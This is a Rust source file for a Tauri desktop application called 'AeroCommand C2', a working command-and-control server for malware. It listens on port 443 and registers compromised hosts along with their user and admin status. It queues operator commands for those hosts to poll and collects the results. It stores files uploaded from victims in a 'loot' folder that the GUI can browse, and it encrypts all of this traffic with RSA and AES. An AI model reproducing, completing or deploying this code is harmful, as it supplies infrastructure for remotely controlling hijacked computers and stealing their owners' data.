use serde::{Deserialize, Serialize};
use std::sync::{Arc, Mutex};
use std::thread;
use rusqlite::Connection;
use chrono::Local;
use tauri::State;
use base64::{engine::general_purpose, Engine as _};

#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct Client {
    pub id: String,
    pub host: String,
    pub ip: String,
    pub pid: i32,
    pub os: String,
    pub user: String,
    pub admin: bool,
    pub first_seen: String,
    pub last_seen: String,
    pub status: String,
    pub cpu_usage: f32,
    pub ram_usage: f32,
    pub disk_usage: f32,
    pub net_usage: f32,
}

#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct CommandLog {
    pub id: i32,
    pub client_id: String,
    pub command: String,
    pub output: String,
    pub timestamp: String,
    pub status: String,
}

use rsa::{RsaPrivateKey, RsaPublicKey, Oaep};
use rsa::pkcs1::{DecodeRsaPrivateKey, EncodeRsaPrivateKey};
use rsa::pkcs8::EncodePublicKey;
use aes_gcm::{Aes256Gcm, Key, Nonce, AeadCore};
use aes_gcm::aead::{Aead, KeyInit, OsRng};
use sha2::Sha256;
use std::fs;
use std::path::Path;

pub struct AppState {
    pub clients: Mutex<Vec<Client>>,
    pub logs: Mutex<Vec<CommandLog>>,
    pub pending_commands: Mutex<std::collections::HashMap<String, Vec<String>>>,
    pub rsa_private_key: RsaPrivateKey,
    pub rsa_public_pem: String,
    pub client_sessions: Mutex<std::collections::HashMap<String, Vec<u8>>>,
}

fn load_or_generate_rsa_key() -> (RsaPrivateKey, String) {
    let key_path = "server_rsa.pem";
    if Path::new(key_path).exists() {
        if let Ok(pem_data) = fs::read_to_string(key_path) {
            if let Ok(priv_key) = RsaPrivateKey::from_pkcs1_pem(&pem_data) {
                let pub_key = RsaPublicKey::from(&priv_key);
                if let Ok(pub_pem) = pub_key.to_public_key_pem(rsa::pkcs8::LineEnding::LF) {
                    return (priv_key, pub_pem);
                }
            }
        }
    }
    
    let mut rng = rand::thread_rng();
    let priv_key = RsaPrivateKey::new(&mut rng, 2048).expect("failed to generate rsa key");
    let pub_key = RsaPublicKey::from(&priv_key);
    let priv_pem = priv_key.to_pkcs1_pem(rsa::pkcs8::LineEnding::LF).expect("failed priv pem");
    let pub_pem = pub_key.to_public_key_pem(rsa::pkcs8::LineEnding::LF).expect("failed pub pem");
    let _ = fs::write(key_path, priv_pem);
    (priv_key, pub_pem)
}

fn decrypt_aes(raw_b64: &str, aes_key: &[u8]) -> Option<String> {
    if let Ok(raw) = general_purpose::STANDARD.decode(raw_b64) {
        if raw.len() < 32 { return None; }
        let nonce_bytes = &raw[0..16];
        let tag_bytes = &raw[16..32];
        let ciphertext = &raw[32..];
        
        let key = Key::<Aes256Gcm>::from_slice(aes_key);
        let cipher = Aes256Gcm::new(key);
        let nonce = Nonce::from_slice(nonce_bytes);
        
        // Combine tag + ciphertext or use payload format depending on aes-gcm crate
        // In aes-gcm v0.10, encrypt_and_digest produces ciphertext + tag appended.
        // Let's support both formats: nonce (16) + ciphertext + tag (16) or nonce (16) + tag (16) + ciphertext.
        // In server.py: payload = nonce (16) + tag (16) + ciphertext
        let mut combined = Vec::new();
        combined.extend_from_slice(ciphertext);
        combined.extend_from_slice(tag_bytes);
        
        if let Ok(decrypted) = cipher.decrypt(nonce, combined.as_ref()) {
            return String::from_utf8(decrypted).ok();
        }
    }
    None
}

fn encrypt_aes(json_str: &str, aes_key: &[u8]) -> String {
    let key = Key::<Aes256Gcm>::from_slice(aes_key);
    let cipher = Aes256Gcm::new(key);
    let generated_nonce = Aes256Gcm::generate_nonce(&mut OsRng);
    
    if let Ok(encrypted_tag) = cipher.encrypt(&generated_nonce, json_str.as_bytes()) {
        // encrypted_tag contains ciphertext + tag (16 bytes at end)
        let cipher_len = encrypted_tag.len() - 16;
        let ciphertext = &encrypted_tag[0..cipher_len];
        let tag = &encrypted_tag[cipher_len..];
        
        let mut payload = Vec::new();
        payload.extend_from_slice(generated_nonce.as_slice());
        payload.extend_from_slice(tag);
        payload.extend_from_slice(ciphertext);
        return general_purpose::STANDARD.encode(payload);
    }
    String::new()
}

fn clean_client_id(raw_id: &str, remote_ip: &str, pid: Option<i64>) -> String {
    let mut id = raw_id.replace(" ", "")
        .replace("%3A", ":")
        .replace("%2E", ".")
        .replace("%2D", "-")
        .replace("%5F", "_");
    
    if id.starts_with("unknown") {
        id = id.replace("unknown", remote_ip);
    }
    
    // If the ID still doesn't have a PID (no colon) and we have one, append it
    if !id.contains(':') {
        if let Some(p) = pid {
            if p > 0 {
                id = format!("{}:{}", id, p);
            }
        }
    }
    
    id.trim().to_string()
}

fn init_db() -> rusqlite::Result<()> {
    let conn = Connection::open("aerocommand.db")?;
    conn.execute(
        "CREATE TABLE IF NOT EXISTS clients (
            id TEXT PRIMARY KEY,
            host TEXT,
            ip TEXT,
            pid INTEGER,
            os TEXT,
            user TEXT,
            admin BOOLEAN,
            first_seen TEXT,
            last_seen TEXT,
            status TEXT
        )",
        [],
    )?;
    conn.execute(
        "CREATE TABLE IF NOT EXISTS logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            client_id TEXT,
            command TEXT,
            output TEXT,
            timestamp TEXT,
            status TEXT
        )",
        [],
    )?;
    Ok(())
}

#[tauri::command]
fn get_clients(state: State<Arc<AppState>>) -> Vec<Client> {
    state.clients.lock().unwrap().clone()
}

#[tauri::command]
fn get_logs(state: State<Arc<AppState>>) -> Vec<CommandLog> {
    state.logs.lock().unwrap().clone()
}

#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct LootFile {
    pub name: String,
    pub path: String,
    pub size: u64,
    pub timestamp: String,
    pub client: String,
}

#[tauri::command]
fn get_loot() -> Vec<LootFile> {
    let mut loot = vec![];
    let loot_dir = std::path::Path::new("loot");
    if !loot_dir.exists() {
        return loot;
    }

    if let Ok(entries) = std::fs::read_dir(loot_dir) {
        for entry in entries.flatten() {
            if entry.path().is_dir() {
                let client_name = entry.file_name().to_string_lossy().to_string();
                if let Ok(sub_entries) = std::fs::read_dir(entry.path()) {
                    for sub_entry in sub_entries.flatten() {
                        if sub_entry.path().is_file() {
                            let metadata = sub_entry.metadata().unwrap();
                            loot.push(LootFile {
                                name: sub_entry.file_name().to_string_lossy().to_string(),
                                path: sub_entry.path().to_string_lossy().to_string(),
                                size: metadata.len(),
                                timestamp: metadata.modified().map(|t| {
                                    let dt: chrono::DateTime<chrono::Local> = t.into();
                                    dt.format("%Y-%m-%d %H:%M:%S").to_string()
                                }).unwrap_or_default(),
                                client: client_name.clone(),
                            });
                        }
                    }
                }
            }
        }
    }
    loot.sort_by(|a, b| b.timestamp.cmp(&a.timestamp));
    loot
}

#[tauri::command]
fn get_loot_file(path: String) -> Result<String, String> {
    let content = std::fs::read(path).map_err(|e| e.to_string())?;
    Ok(general_purpose::STANDARD.encode(content))
}

#[tauri::command]
fn send_command(client_id: String, command: String, state: State<Arc<AppState>>) -> String {
    let mut pending = state.pending_commands.lock().unwrap();
    pending.entry(client_id.clone()).or_insert(vec![]).push(command.clone());
    
    let mut logs = state.logs.lock().unwrap();
    let new_id = (logs.len() + 1) as i32;
    logs.push(CommandLog {
        id: new_id,
        client_id,
        command,
        output: "Queued...".to_string(),
        timestamp: Local::now().format("%Y-%m-%d %H:%M:%S").to_string(),
        status: "PENDING".to_string(),
    });

    "OK".to_string()
}

fn decrypt_request_payload(content: &str, client_id_opt: Option<&str>, state: &AppState) -> Option<serde_json::Value> {
    if let Some(cid) = client_id_opt {
        let sessions = state.client_sessions.lock().unwrap();
        if let Some(aes_key) = sessions.get(cid) {
            if let Some(decrypted_str) = decrypt_aes(content, aes_key) {
                if let Ok(val) = serde_json::from_str(&decrypted_str) {
                    return Some(val);
                }
            }
        }
    }

    if let Ok(packet) = serde_json::from_str::<serde_json::Value>(content) {
        if let (Some(enc_key_b64), Some(payload_b64)) = (packet["encrypted_session_key"].as_str(), packet["payload"].as_str()) {
            if let Ok(enc_key_bytes) = general_purpose::STANDARD.decode(enc_key_b64) {
                let padding = Oaep::new::<Sha256>();
                if let Ok(aes_key) = state.rsa_private_key.decrypt(padding, &enc_key_bytes) {
                    if let Some(decrypted_str) = decrypt_aes(payload_b64, &aes_key) {
                        if let Ok(inner_val) = serde_json::from_str::<serde_json::Value>(&decrypted_str) {
                            if let Some(cid) = inner_val["client_id"].as_str() {
                                let mut sessions = state.client_sessions.lock().unwrap();
                                sessions.insert(cid.to_string(), aes_key);
                            } else if let (Some(ip), Some(pid)) = (inner_val["ip"].as_str(), inner_val["pid"].as_i64()) {
                                let raw_id = inner_val["client_id"].as_str().unwrap_or("unknown");
                                let cid = clean_client_id(raw_id, ip, Some(pid));
                                let mut sessions = state.client_sessions.lock().unwrap();
                                sessions.insert(cid, aes_key);
                            }
                            return Some(inner_val);
                        }
                    }
                }
            }
        }
    }

    serde_json::from_str(content).ok()
}

fn encrypt_response_for_client(json_val: serde_json::Value, client_id: &str, state: &AppState) -> String {
    let json_str = serde_json::to_string(&json_val).unwrap_or_default();
    let sessions = state.client_sessions.lock().unwrap();
    if let Some(aes_key) = sessions.get(client_id) {
        return encrypt_aes(&json_str, aes_key);
    }
    json_str
}

#[cfg_attr(mobile, tauri::mobile_entry_point)]
pub fn run() {
    let _ = init_db();
    let (rsa_priv, rsa_pub_pem) = load_or_generate_rsa_key();

    let app_state = Arc::new(AppState {
        clients: Mutex::new(vec![]),
        logs: Mutex::new(vec![]),
        pending_commands: Mutex::new(std::collections::HashMap::new()),
        rsa_private_key: rsa_priv,
        rsa_public_pem: rsa_pub_pem,
        client_sessions: Mutex::new(std::collections::HashMap::new()),
    });

    let state_for_thread = Arc::clone(&app_state);
    thread::spawn(move || {
        if let Ok(server) = tiny_http::Server::http("0.0.0.0:443") {
            println!("[+] AeroCommand C2 listening on port 443 (Hybrid AES+RSA)");
            for mut request in server.incoming_requests() {
                let url = request.url().to_string();
                let client_ip = request.remote_addr().map(|a| a.ip().to_string()).unwrap_or("0.0.0.0".to_string());
                
                println!("[*] Incoming request URL: {} from {}", url, client_ip);
                let clean_url = format!("/{}", url.trim_start_matches('/'));

                if clean_url.starts_with("/rsa_pub") {
                    let _ = request.respond(tiny_http::Response::from_string(state_for_thread.rsa_public_pem.clone()));
                } else if clean_url.starts_with("/register") {
                    println!("[+] REGISTRATION PACKET RECEIVED from {}", client_ip);
                    let mut content = String::new();
                    let _ = request.as_reader().read_to_string(&mut content);
                    
                    if let Some(info) = decrypt_request_payload(&content, None, &state_for_thread) {
                        println!("[DEBUG] Decrypted Registration: {}", info);
                        let mut ip = info["ip"].as_str().unwrap_or("unknown").trim().to_string();
                        if ip == "unknown" || ip == "127.0.0.1" {
                            ip = client_ip.trim().to_string();
                        }
                        
                        let pid = info["pid"].as_i64().unwrap_or(0);
                        let raw_id = info["client_id"].as_str().unwrap_or("unknown");
                        let client_id = clean_client_id(raw_id, &ip, Some(pid));
                            
                        let mut clients = state_for_thread.clients.lock().unwrap();
                        let now = Local::now().format("%Y-%m-%d %H:%M:%S").to_string();
                        
                        println!("[+] Registering client: {} (Host: {})", client_id, info["host"].as_str().unwrap_or("Unknown"));
                        
                        if let Some(c) = clients.iter_mut().find(|c| c.id == client_id) {
                            c.last_seen = now;
                            c.status = "ALIVE".to_string();
                            c.pid = pid as i32;
                            c.host = info["host"].as_str().unwrap_or(&c.host).to_string();
                        } else {
                            clients.push(Client {
                                id: client_id,
                                host: info["host"].as_str().unwrap_or("Unknown").trim().to_string(),
                                ip: ip,
                                pid: pid as i32,
                                os: info["os"].as_str().unwrap_or("Unknown").trim().to_string(),
                                user: info["user"].as_str().unwrap_or("Unknown").trim().to_string(),
                                admin: info["admin"].as_bool().unwrap_or(false),
                                first_seen: now.clone(),
                                last_seen: now,
                                status: "ALIVE".to_string(),
                                cpu_usage: 0.0,
                                ram_usage: 0.0,
                                disk_usage: 0.0,
                                net_usage: 0.0,
                            });
                        }
                    } else {
                        println!("[!] FAILED TO DECRYPT registration packet from {}", client_ip);
                    }
                    let _ = request.respond(tiny_http::Response::from_string("OK"));
                } else if clean_url.starts_with("/cmd") {
                    println!("[+] COMMAND POLL from {}", client_ip);
                    let raw_id = clean_url.split("id=").nth(1).unwrap_or("").to_string();
                    let client_id = clean_client_id(&raw_id, &client_ip, None);
                    
                    let mut response_json = serde_json::json!({});
                    let mut is_known = false;

                    if !client_id.is_empty() {
                        let mut clients = state_for_thread.clients.lock().unwrap();
                        let now = Local::now().format("%Y-%m-%d %H:%M:%S").to_string();
                        if let Some(c) = clients.iter_mut().find(|c| c.id == client_id) {
                            c.last_seen = now;
                            c.status = "ALIVE".to_string();
                            is_known = true;
                        }
                    }

                    if !is_known && !client_id.is_empty() {
                        // Unknown client - tell it to re-register
                        println!("[!] Unknown client {} polling. Sending re-register request.", client_id);
                        response_json = serde_json::json!({"action": "re-register"});
                    } else if is_known {
                        let mut pending = state_for_thread.pending_commands.lock().unwrap();
                        if let Some(cmds) = pending.get_mut(&client_id) {
                            if !cmds.is_empty() {
                                response_json = serde_json::json!({"command": cmds.remove(0)});
                            }
                        }
                    }
                    
                    let encrypted = encrypt_response_for_client(response_json, &client_id, &state_for_thread);
                    let _ = request.respond(tiny_http::Response::from_string(encrypted));
                } else if clean_url.starts_with("/result") {
                    println!("[+] COMMAND RESULT from {}", client_ip);
                    let mut content = String::new();
                    let _ = request.as_reader().read_to_string(&mut content);
                    
                    if let Some(data) = decrypt_request_payload(&content, None, &state_for_thread) {
                        let pid = data["pid"].as_i64();
                        let raw_id = data["client_id"].as_str().unwrap_or("unknown");
                        let client_id = clean_client_id(raw_id, &client_ip, pid);
                        let output = data["output"].as_str().unwrap_or("").to_string();
                        let mut logs = state_for_thread.logs.lock().unwrap();
                        
                        // Check if this is telemetry data
                        if let Ok(telemetry) = serde_json::from_str::<serde_json::Value>(&output) {
                            if telemetry.get("cpu").is_some() || telemetry.get("ram").is_some() {
                                let mut clients = state_for_thread.clients.lock().unwrap();
                                if let Some(c) = clients.iter_mut().find(|c| c.id == client_id) {
                                    c.cpu_usage = telemetry["cpu"].as_f64().unwrap_or(0.0) as f32;
                                    c.ram_usage = telemetry["ram"].as_f64().unwrap_or(0.0) as f32;
                                    c.disk_usage = telemetry["disk"].as_f64().unwrap_or(0.0) as f32;
                                    c.net_usage = telemetry["net"].as_f64().unwrap_or(0.0) as f32;
                                }
                            }
                        }

                        // Try to find the most recent PENDING log for this client to update
                        if let Some(log) = logs.iter_mut().rev().find(|l| l.client_id == client_id && l.status == "PENDING") {
                            log.output = output;
                            log.status = "SUCCESS".to_string();
                            log.timestamp = Local::now().format("%Y-%m-%d %H:%M:%S").to_string();
                        } else {
                            // Fallback: create new entry if no pending one found
                            let new_id = (logs.len() + 1) as i32;
                            logs.push(CommandLog {
                                id: new_id,
                                client_id,
                                command: "Result".to_string(),
                                output,
                                timestamp: Local::now().format("%Y-%m-%d %H:%M:%S").to_string(),
                                status: "SUCCESS".to_string(),
                            });
                        }
                    }
                    let _ = request.respond(tiny_http::Response::from_string("OK"));
                } else if clean_url.starts_with("/upload") {
                    println!("[+] FILE UPLOAD from {}", client_ip);
                    let mut content = String::new();
                    let _ = request.as_reader().read_to_string(&mut content);
                    
                    if let Some(data) = decrypt_request_payload(&content, None, &state_for_thread) {
                        let filename = data["name"].as_str().unwrap_or("unknown");
                        let b64_data = data["file"].as_str().unwrap_or("");
                        let client_id = data["client_id"].as_str().unwrap_or("unknown");
                        
                        let mut host = "unknown".to_string();
                        {
                            let clients = state_for_thread.clients.lock().unwrap();
                            if let Some(c) = clients.iter().find(|c| c.id == client_id) {
                                host = c.host.clone();
                            }
                        }

                        if let Ok(file_bytes) = general_purpose::STANDARD.decode(b64_data) {
                            let client_loot_dir = std::path::Path::new("loot").join(&host);
                            let _ = std::fs::create_dir_all(&client_loot_dir);
                            let save_path = client_loot_dir.join(filename);
                            let _ = std::fs::write(save_path, file_bytes);
                            println!("[+] Saved file {} for client {}", filename, host);
                        }
                    }
                    let _ = request.respond(tiny_http::Response::from_string("OK"));
                } else {
                    let _ = request.respond(tiny_http::Response::from_string("AeroCommand C2"));
                }
            }
        }
    });

    tauri::Builder::default()
        .manage(app_state)
        .plugin(tauri_plugin_opener::init())
        .invoke_handler(tauri::generate_handler![get_clients, get_logs, send_command, get_loot, get_loot_file])
        .run(tauri::generate_context!())
        .expect("error while running tauri application");
}
